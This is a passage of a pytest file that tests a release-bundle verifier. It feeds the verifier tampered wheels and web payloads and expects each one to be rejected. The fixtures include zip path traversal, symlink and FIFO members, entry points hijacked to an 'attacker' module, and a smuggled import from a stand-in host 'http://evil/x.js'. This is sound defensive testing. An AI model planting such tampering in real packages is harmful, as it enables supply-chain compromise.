from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import subprocess
import zipfile
from pathlib import Path

import pytest

from distribution.bundle import (
    _REQUIRED_WEB_PATHS,
    _WORKSPACE_DISTRIBUTIONS,
    BundleBuilder,
    BundleVerificationError,
    _web_path_allowed,
    verify_bundle,
)

WEB_LOCK_SHA256 = "3" * 64


def _rewrite_web_ledger(root: Path, ledger: Path) -> None:
    entries = []
    for path in sorted(item for item in root.rglob("*") if item.is_file()):
        payload = path.read_bytes()
        entries.append(
            f"{hashlib.sha256(payload).hexdigest()}  {len(payload)}  "
            f"{path.relative_to(root).as_posix()}"
        )
    ledger.write_text("\n".join(entries) + "\n")


def _rewrite_outer_checksums(bundle: Path) -> None:
    lines = []
    for path in sorted(
        item for item in bundle.rglob("*") if item.is_file() and item.name != "checksums.sha256"
    ):
        lines.append(
            f"{hashlib.sha256(path.read_bytes()).hexdigest()}  "
            f"{path.relative_to(bundle).as_posix()}"
        )
    (bundle / "checksums.sha256").write_text("\n".join(lines) + "\n")


def _rewrite_schema2_web_bindings(bundle: Path) -> None:
    ledger = bundle / "artifacts/web-payload.sha256"
    _rewrite_web_ledger(bundle / "artifacts/web", ledger)
    ledger_digest = hashlib.sha256(ledger.read_bytes()).hexdigest()
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["web_payload"]["ledger_sha256"] = ledger_digest
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    sbom_path = bundle / "sbom.cdx.json"
    sbom = json.loads(sbom_path.read_text())
    web_component = next(
        component for component in sbom["components"] if component["name"] == "cortex-web-release"
    )
    web_component["hashes"][0]["content"] = ledger_digest
    adapter_component = next(
        component
        for component in sbom["components"]
        if component["name"] == "cortex-web-node-adapter"
    )
    adapter_digest = hashlib.sha256(
        (bundle / "artifacts/web/server/node-adapter.mjs").read_bytes()
    ).hexdigest()
    adapter_component["hashes"][0]["content"] = adapter_digest
    sbom_path.write_text(json.dumps(sbom, sort_keys=True, separators=(",", ":")) + "\n")
    provenance_path = bundle / "provenance-inputs.json"
    provenance = json.loads(provenance_path.read_text())
    provenance["web_build_inputs"]["payload_ledger_sha256"] = ledger_digest
    provenance["web_build_inputs"]["node_adapter"]["sha256"] = adapter_digest
    provenance_path.write_text(
        json.dumps(provenance, sort_keys=True, separators=(",", ":")) + "\n"
    )
    _rewrite_outer_checksums(bundle)


def _rewrite_wheel(
    wheel: Path,
    *,
    remove: str | None = None,
    script: str | None = None,
    duplicate_script: str | None = None,
    unsafe_member: str | None = None,
    entry_attack: str | None = None,
) -> None:
    replacement = wheel.with_suffix(".replacement")
    with zipfile.ZipFile(wheel) as source, zipfile.ZipFile(replacement, "w") as destination:
        for member in source.namelist():
            if member == remove:
                continue
            payload = source.read(member)
            output_member = member
            if script is not None and member.endswith(".dist-info/entry_points.txt"):
                text = payload.decode()
                text = text.replace(
                    f"{script} = deployment.private_access.",
                    f"{script} = attacker.private_access.",
                )
                payload = text.encode()
            if duplicate_script is not None and member.endswith(".dist-info/entry_points.txt"):
                text = payload.decode().replace(
                    "[console_scripts]\n",
                    "[console_scripts]\n"
                    f"{duplicate_script} = attacker.private_access:main\n",
                )
                payload = text.encode()
            if unsafe_member == "oversized_metadata" and member.endswith(
                ".dist-info/entry_points.txt"
            ):
                payload += b"\n[padding]\nvalue = " + b"a" * (1024 * 1024)
            if entry_attack == "default-inheritance" and member.endswith(
                ".dist-info/entry_points.txt"
            ):
                text = payload.decode()
                required = [
                    line
                    for line in text.splitlines()
                    if line.startswith("cortex-private-access")
                ]
                retained = [line for line in text.splitlines() if line not in required]
                payload = ("[DEFAULT]\n" + "\n".join(required + retained) + "\n").encode()
            if entry_attack == "attacker-dist-info" and member.endswith(
                ".dist-info/entry_points.txt"
            ):
                output_member = "attacker-9.9.9.dist-info/entry_points.txt"
            destination.writestr(output_member, payload)
        if unsafe_member == "traversal":
            destination.writestr("../outside.py", b"unsafe")
        elif unsafe_member == "backslash":
            destination.writestr(r"deployment\private_access\unsafe.py", b"unsafe")
        elif unsafe_member == "absolute":
            destination.writestr("/absolute.py", b"unsafe")
        elif unsafe_member == "symlink":
            link = zipfile.ZipInfo("deployment/private_access/unsafe-link.py")
            link.create_system = 3
            link.external_attr = (0o120777 << 16) | 0x20
            destination.writestr(link, b"cli.py")
        elif unsafe_member == "special":
            fifo = zipfile.ZipInfo("deployment/private_access/unsafe-fifo")
            fifo.create_system = 3
            fifo.external_attr = (0o010644 << 16) | 0x20
            destination.writestr(fifo, b"")
        elif unsafe_member == "case_collision":
            destination.writestr("Deployment/private_access/cli.py", b"unsafe")
        elif unsafe_member == "unicode_collision":
            destination.writestr("deployment/private_access/caf\N{LATIN SMALL LETTER E WITH ACUTE}.py", b"one")
            destination.writestr("deployment/private_access/cafe\N{COMBINING ACUTE ACCENT}.py", b"two")
        elif unsafe_member == "post_casefold_unicode_collision":
            destination.writestr("deployment/private_access/S\N{COMBINING ACUTE ACCENT}.py", b"one")
            destination.writestr(
                "deployment/private_access/\N{LATIN SMALL LETTER LONG S}\N{COMBINING ACUTE ACCENT}.py",
                b"two",
            )
    os.replace(replacement, wheel)


def test_bundle_is_closed_auditable_and_movable(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
) -> None:
    output = tmp_path / "path with spaces" / "cortex developer.bundle"
    builder = BundleBuilder(output)
    result = builder.assemble(
        release_id="cortex-dev-1",
        release_sequence=1,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
    )

    verified = verify_bundle(result.path)
    assert verified.manifest["channel"] == "developer-unsigned"
    assert verified.manifest["dependency_closure"] == "partial"
    assert verified.manifest["capabilities"]["sqlite_vec"] is False
    assert verified.manifest["capabilities"]["ocr"] is False
    assert verified.manifest["hermes_boundary"]["slot_included"] is False
    assert verified.manifest["signing"]["signed"] is False
    assert verified.sbom["bomFormat"] == "CycloneDX"
    assert verified.provenance["claim"] == "inputs-only"

    copied = tmp_path / "copied elsewhere" / result.path.name
    copied.parent.mkdir()
    import shutil

    shutil.copytree(result.path, copied)
    assert verify_bundle(copied).digest == verified.digest

    import subprocess
    import venv

    clean_runtime = tmp_path / "clean-python"
    venv.EnvBuilder(with_pip=False).create(clean_runtime)

    completed = subprocess.run(
        [str(copied / "cortex-dist"), "verify", "--bundle", str(copied)],
        check=False,
        capture_output=True,
        text=True,
        env={
            "PATH": "/usr/bin:/bin",
            "PYTHON": str(clean_runtime / "bin" / "python"),
        },
    )
    assert completed.returncode == 0, completed.stdout + completed.stderr
    standalone_prefix = tmp_path / "standalone-distribution"
    installed = subprocess.run(
        [
            str(copied / "cortex-dist"),
            "install",
            "--bundle",
            str(copied),
            "--prefix",
            str(standalone_prefix),
            "--allow-unsigned-developer",
        ],
        check=False,
        capture_output=True,
        text=True,
        env={
            "PATH": "/usr/bin:/bin",
            "PYTHON": str(clean_runtime / "bin" / "python"),
        },
    )
    assert installed.returncode == 0, installed.stdout + installed.stderr
    assert (standalone_prefix / "current.json").is_file()
    assert not tuple(copied.rglob("__pycache__"))


def test_schema1_digest_remains_the_manifest_digest(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
) -> None:
    result = BundleBuilder(tmp_path / "wheel-only").assemble(
        release_id="cortex-dev-1",
        release_sequence=1,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
    )
    verified = verify_bundle(result.path)

    assert verified.manifest["schema_version"] == 1
    assert "web_payload" not in verified.manifest
    assert "private_access" not in verified.manifest
    assert verified.sbom["version"] == 1
    assert verified.provenance["schema_version"] == 1
    assert verified.digest == hashlib.sha256(
        (result.path / "manifest.json").read_bytes()
    ).hexdigest()
    assert result.digest == verified.digest


def test_schema1_accepts_historical_complete_wheel_closure(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
) -> None:
    bundle = BundleBuilder(tmp_path / "wheel-only-complete").assemble(
        release_id="cortex-dev-1",
        release_sequence=1,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
    ).path
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["dependency_closure"] = "complete"
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    sbom_path = bundle / "sbom.cdx.json"
    sbom = json.loads(sbom_path.read_text())
    sbom["properties"][0]["value"] = "complete"
    sbom_path.write_text(json.dumps(sbom, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    verified = verify_bundle(bundle)

    assert verified.manifest["schema_version"] == 1
    assert verified.manifest["dependency_closure"] == "complete"
    assert verified.digest == hashlib.sha256(manifest_path.read_bytes()).hexdigest()


def test_composed_bundle_binds_web_and_private_access_and_is_movable(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure
    result = BundleBuilder(tmp_path / "composed bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    )

    verified = verify_bundle(result.path, node_executable=analyser_node)
    cortex_wheel = next(
        artifact
        for artifact in verified.manifest["artifacts"]
        if artifact["role"] == "cortex-wheel"
    )
    assert verified.manifest["schema_version"] == 2
    assert verified.manifest["dependency_closure"] == "complete"
    assert verified.manifest["web_payload"] == {
        "root": "artifacts/web",
        "ledger_path": "artifacts/web-payload.sha256",
        "ledger_sha256": hashlib.sha256(web_ledger.read_bytes()).hexdigest(),
        "release_build_id": "cortex-r0-build-1",
        "package_lock_sha256": WEB_LOCK_SHA256,
        "node_adapter_version": 1,
        "node_policy": {
            "runtime": "compatible-host-node",
            "allowed_imports": ["node-builtins", "relative-payload"],
            "forbidden_commands": ["npm", "npx", "vinext", "wrangler"],
        },
    }
    assert verified.manifest["private_access"] == {
        "wheel_path": cortex_wheel["path"],
        "wheel_sha256": cortex_wheel["sha256"],
        "required_modules": [
            "deployment/private_access/__init__.py",
            "deployment/private_access/cli.py",
            "deployment/private_access/gateway.py",
            "deployment/private_access/supervision.py",
        ],
        "console_scripts": {
            "cortex-private-access": "deployment.private_access.cli:main",
            "cortex-private-access-gateway": "deployment.private_access.gateway:main",
            "cortex-private-access-supervisor": "deployment.private_access.supervision:main",
        },
    }
    assert verified.digest == hashlib.sha256(
        (result.path / "checksums.sha256").read_bytes()
    ).hexdigest()

    copied = tmp_path / "moved" / "bundle"
    copied.parent.mkdir()
    import shutil

    shutil.copytree(result.path, copied)
    assert verify_bundle(copied, node_executable=analyser_node).digest == verified.digest


def test_composed_bundle_rejects_missing_required_web_path(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure
    (web_root / "server/index.js").unlink()
    _rewrite_web_ledger(web_root, web_ledger)

    with pytest.raises(BundleVerificationError, match="required Web payload"):
        BundleBuilder(tmp_path / "bundle").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
        node_executable=analyser_node,
        )


def test_web_closure_allowlist_covers_every_first_party_payload_file() -> None:
    """Every file the Web release ships as first-party must pass the Python allowlist.

    `apps/web/scripts/release-payload.mjs` decides what enters the Web payload and
    `distribution/bundle.py` decides what a bundle may contain. The two lists live on
    opposite sides of the release and every payload fixture in this suite is
    hand-written, so a first-party addition on the Web side reached a real bundle
    build before anything failed. Reading the Web source keeps the two coupled.
    """

    repository = Path(__file__).resolve().parents[2]
    source = (repository / "apps/web/scripts/release-payload.mjs").read_text()
    declaration = re.search(r"const FIRST_PARTY_FILES = new Map\(\[(.*?)\]\);", source, re.DOTALL)
    assert declaration is not None, "release-payload.mjs no longer declares FIRST_PARTY_FILES"
    entries = re.findall(
        r'\[\s*"([^"]+)"\s*,\s*path\.join\(\s*webRoot\s*,\s*"([^"]+)"\s*\)\s*,?\s*\]',
        declaration.group(1),
    )
    assert entries, "FIRST_PARTY_FILES no longer holds [relative, path.join(webRoot, relative)]"
    for relative, filename in entries:
        assert relative == filename, f"FIRST_PARTY_FILES key and file disagree: {relative}"
        assert _web_path_allowed(relative), (
            f"{relative} ships in the Web payload but the Web closure allowlist rejects it"
        )

    # Required implies allowed, or a compliant payload could never verify.
    assert all(_web_path_allowed(relative) for relative in _REQUIRED_WEB_PATHS)
    # A payload file introduced after an earlier generation was built has to be
    # allowed WITHOUT being required: these tools re-verify the older, installed
    # bundle during `upgrade` and `rollback`, and that bundle does not carry it.
    assert _web_path_allowed("server/access-identity-bound.mjs")
    assert "server/access-identity-bound.mjs" not in _REQUIRED_WEB_PATHS


@pytest.mark.parametrize(
    "provided",
    [
        "web_payload_root",
        "web_payload_ledger",
        "web_build_id",
        "web_lock_sha256",
        "node_adapter_version",
    ],
)
def test_composed_bundle_rejects_partial_web_inputs(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    provided: str,
) -> None:
    web_root, web_ledger = web_closure
    values = {
        "web_payload_root": web_root,
        "web_payload_ledger": web_ledger,
        "web_build_id": "cortex-r0-build-1",
        "web_lock_sha256": WEB_LOCK_SHA256,
        "node_adapter_version": 1,
    }
    with pytest.raises(BundleVerificationError, match="provided together"):
        BundleBuilder(tmp_path / f"bundle-{provided}").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            **{provided: values[provided]},
        )


@pytest.mark.parametrize(
    ("build_id", "adapter_version"),
    [("short", 1), ("cortex-r0-build-1", 2)],
)
def test_composed_bundle_rejects_unsupported_web_metadata_before_copy(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    build_id: str,
    adapter_version: int,
) -> None:
    web_root, web_ledger = web_closure
    output = tmp_path / "bundle"
    with pytest.raises(BundleVerificationError, match="composed Web metadata"):
        BundleBuilder(output).assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id=build_id,
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=adapter_version,
        )
    assert not output.exists()


@pytest.mark.parametrize(
    ("case", "relative", "contents"),
    [
        ("extra", "client/unexpected.txt", "unexpected\n"),
        ("build-metadata", "server/.vite/manifest.json", "{}\n"),
        ("source-map", "client/assets/app.js.map", "{}\n"),
        ("node-modules", "node_modules/react/index.js", "export {};\n"),
        ("development", "server/index.js", 'export default "npm run dev";\n'),
        (
            "vinext-development",
            "server/index.js",
            'export default "cortex-r0-build-1 vinext start";\n',
        ),
        ("absolute-path", "server/index.js", 'export default "/Users/operator/checkout";\n'),
        ("bare-import", "server/index.js", 'import React from "react";\n'),
        (
            "bare-export",
            "server/index.js",
            'export { React } from "react"; export default "cortex-r0-build-1";\n',
        ),
        (
            "browser-secret",
            "client/assets/app.js",
            'export const leaked = "CORTEX_CONTROL_TOKEN";\n',
        ),
    ],
)
def test_composed_bundle_rejects_unsafe_web_closure(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
    relative: str,
    contents: str,
) -> None:
    web_root, web_ledger = web_closure
    target = web_root / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(contents)
    _rewrite_web_ledger(web_root, web_ledger)

    with pytest.raises(BundleVerificationError, match="unsafe Web closure"):
        BundleBuilder(tmp_path / f"bundle-{case}").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
        node_executable=analyser_node,
        )


@pytest.mark.parametrize(
    ("case", "relative", "attack"),
    [
        ("compact-side-effect", "server/index.js", 'void 0;import"react";\n'),
        ("compact-export", "client/assets/app.js", 'export{ready}from"react";\n'),
        ("relative-escape", "server/index.js", 'import "../../outside.js";\n'),
        ("unresolved-relative", "server/index.js", 'import "./missing.js";\n'),
        ("query", "server/index.js", 'import "./index.js?raw";\n'),
        ("hash", "server/index.js", 'import "./index.js#release";\n'),
        ("client-root-escape", "client/assets/app.js", 'import "/../server/index.js";\n'),
        ("nonliteral-dynamic", "server/index.js", "import(target);\n"),
        ("template-dynamic", "server/index.js", 'const lazy = `${import("react")}`;\n'),
        ("regex-comment-spoof", "server/index.js", 'const slash = /\\//; import("react");\n'),
        ("line-separator", "server/index.js", '// ignored\N{LINE SEPARATOR}import("react");\n'),
        (
            "paragraph-separator",
            "server/index.js",
            '// ignored\N{PARAGRAPH SEPARATOR}import("react");\n',
        ),
    ],
)
def test_schema2_rewritten_ledger_rejects_unsafe_module_references(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
    relative: str,
    attack: str,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / f"bundle-{case}").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    target = bundle / "artifacts/web" / relative
    target.write_text(target.read_text() + attack)
    _rewrite_schema2_web_bindings(bundle)

    with pytest.raises(BundleVerificationError, match="unsafe Web closure"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_composed_bundle_accepts_shipped_node_module_syntax(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure
    adapter = web_root / "server/node-adapter.mjs"
    adapter.write_text(
        'import { realpathSync } from "node:fs";\n'
        + adapter.read_text()
        + "void import.meta.url;\n"
    )
    _rewrite_web_ledger(web_root, web_ledger)

    result = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    )

    assert verify_bundle(result.path, node_executable=analyser_node).manifest["schema_version"] == 2


def test_composed_bundle_accepts_real_vinext_module_shapes(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    # The hand-written JS closure analyzer used to false-positive on legitimate
    # Rolldown/Vinext output. These are the exact shapes the retained real
    # payload contains and none of them is a module escape: template text that
    # merely spells the word "import", import/export used as ordinary property
    # keys, member access, and class-method names, a no-substitution template
    # dynamic import that resolves into the ledger, and a template build id.
    web_root, web_ledger = web_closure
    app = web_root / "client/assets/app.js"
    app.write_text(
        app.read_text()
        + "export const notice = `research import has not started`;\n"
        + "const registry = { import: 1, export: 2 };\n"
        + "const readImport = registry.import;\n"
        + "const readExport = registry.export;\n"
        + "class Threads {\n"
        + "  import(entry) { return entry; }\n"
        + "  export() { return this; }\n"
        + "}\n"
        + "const pending = `count ${registry.import} import queued`;\n"
        + "void [notice, readImport, readExport, Threads, pending];\n"
    )
    server = web_root / "server/index.js"
    server.write_text(
        server.read_text()
        + "export const lazy = () => import(`./ssr/index.js`);\n"
        + "export const diag = `[vinext] error: import * as X from module`;\n"
    )
    _rewrite_web_ledger(web_root, web_ledger)

    result = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    )

    assert verify_bundle(result.path, node_executable=analyser_node).manifest["schema_version"] == 2


def test_composed_bundle_accepts_template_literal_build_identifier(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    # The real server/index.js embeds the build id as a no-substitution template
    # literal, not a plain string. It must be accepted as the build marker.
    web_root, web_ledger = web_closure
    server = web_root / "server/index.js"
    server.write_text("export default `cortex-r0-build-1`;\n")
    _rewrite_web_ledger(web_root, web_ledger)

    result = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    )

    assert verify_bundle(result.path, node_executable=analyser_node).manifest["schema_version"] == 2


@pytest.mark.parametrize(
    ("case", "relative", "attack"),
    [
        (
            "interpolated-dynamic",
            "server/index.js",
            "export const e = () => import(`./${globalThis.chunk}.js`);\n",
        ),
        (
            "escaped-template-dynamic",
            "server/index.js",
            "export const e = () => import(`./index\\u002f.js`);\n",
        ),
        (
            "interpolated-import-in-template",
            "server/index.js",
            'const lazy = `${import("react")}`;\n',
        ),
        (
            "smuggled-method-url",
            "client/assets/app.js",
            "export const g = import(`http://evil/x.js`){};\n",
        ),
        (
            "method-body-bare-import",
            "client/assets/app.js",
            'const o = { load() { return import("react"); } }; void o;\n',
        ),
    ],
)
def test_composed_bundle_still_rejects_interpolated_or_smuggled_imports(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
    relative: str,
    attack: str,
) -> None:
    # Boundary regression guards: the bounded tokenizer extension must keep
    # rejecting non-literal / interpolated dynamic imports, escaped template
    # specifiers, import() interpolated inside a template, a string/template
    # dynamic import disguised as a method by a trailing block, and a bare
    # dynamic import nested inside a method body.
    web_root, web_ledger = web_closure
    target = web_root / relative
    target.write_text(target.read_text() + attack)
    _rewrite_web_ledger(web_root, web_ledger)

    with pytest.raises(BundleVerificationError, match="unsafe Web closure"):
        BundleBuilder(tmp_path / f"bundle-{case}").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
        node_executable=analyser_node,
        )


def test_composed_bundle_rejects_interpolated_build_identifier(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    # An interpolated template build id must fail closed: its literal fragments
    # are inert template text and are never collected as a valid build marker,
    # so the declared build id is absent from the marker set.
    web_root, web_ledger = web_closure
    server = web_root / "server/index.js"
    server.write_text("const chunk = 1;\nexport default `cortex-r0-build-1${chunk}`;\n")
    _rewrite_web_ledger(web_root, web_ledger)

    with pytest.raises(BundleVerificationError, match="unsafe Web closure"):
        BundleBuilder(tmp_path / "bundle").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
        node_executable=analyser_node,
        )


@pytest.mark.parametrize("case", ["symlink", "hardlink", "special"])
def test_composed_bundle_rejects_linked_web_input(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
) -> None:
    web_root, web_ledger = web_closure
    target = web_root / "client/assets/app.js"
    target.unlink()
    if case == "symlink":
        target.symlink_to(web_root / "package.json")
    elif case == "hardlink":
        os.link(web_root / "package.json", target)
    else:
        os.mkfifo(target)
    _rewrite_web_ledger(web_root, web_ledger)

    with pytest.raises(BundleVerificationError, match="unsafe Web closure"):
        BundleBuilder(tmp_path / f"bundle-{case}").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
        node_executable=analyser_node,
        )


@pytest.mark.parametrize(
    "case",
    [
        "duplicate",
        "unsorted",
        "leading-zero",
        "no-newline",
        "absolute",
        "parent",
        "backslash",
    ],
)
def test_composed_bundle_rejects_noncanonical_web_ledger(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
) -> None:
    web_root, web_ledger = web_closure
    lines = web_ledger.read_text().splitlines()
    if case == "duplicate":
        lines.append(lines[0])
    elif case == "unsorted":
        lines.reverse()
    elif case == "leading-zero":
        digest, size, relative = lines[0].split("  ")
        lines[0] = f"{digest}  0{size}  {relative}"
    elif case in {"absolute", "parent", "backslash"}:
        digest, size, relative = lines[0].split("  ")
        unsafe = {
            "absolute": f"/{relative}",
            "parent": f"../{relative}",
            "backslash": f"{relative}\\child",
        }[case]
        lines[0] = f"{digest}  {size}  {unsafe}"
    trailing = "" if case == "no-newline" else "\n"
    web_ledger.write_text("\n".join(lines) + trailing)

    with pytest.raises(BundleVerificationError, match="canonical Web payload ledger"):
        BundleBuilder(tmp_path / f"bundle-{case}").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
        node_executable=analyser_node,
        )


@pytest.mark.parametrize("case", ["missing", "extra"])
def test_composed_bundle_rejects_inexact_web_ledger_coverage(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
) -> None:
    web_root, web_ledger = web_closure
    lines = web_ledger.read_text().splitlines()
    if case == "missing":
        lines.pop()
    else:
        lines.append(f"{'0' * 64}  0  server/ssr/assets/undeclared.js")
        lines.sort(key=lambda line: line.rsplit("  ", 1)[1])
    web_ledger.write_text("\n".join(lines) + "\n")

    with pytest.raises(BundleVerificationError, match="Web payload ledger coverage"):
        BundleBuilder(tmp_path / f"bundle-{case}").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
        node_executable=analyser_node,
        )


@pytest.mark.parametrize(
    ("missing_module", "changed_script", "duplicate_script", "unsafe_member"),
    [
        ("deployment/private_access/__init__.py", None, None, None),
        ("deployment/private_access/cli.py", None, None, None),
        ("deployment/private_access/gateway.py", None, None, None),
        ("deployment/private_access/supervision.py", None, None, None),
        (None, "cortex-private-access", None, None),
        (None, "cortex-private-access-gateway", None, None),
        (None, "cortex-private-access-supervisor", None, None),
        (None, None, "cortex-private-access", None),
        (None, None, None, "traversal"),
        (None, None, None, "backslash"),
        (None, None, None, "absolute"),
        (None, None, None, "symlink"),
        (None, None, None, "special"),
        (None, None, None, "oversized_metadata"),
        (None, None, None, "case_collision"),
        (None, None, None, "unicode_collision"),
        (None, None, None, "post_casefold_unicode_collision"),
    ],
)
def test_composed_bundle_rejects_rewritten_private_access_wheel(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    missing_module: str | None,
    changed_script: str | None,
    duplicate_script: str | None,
    unsafe_member: str | None,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
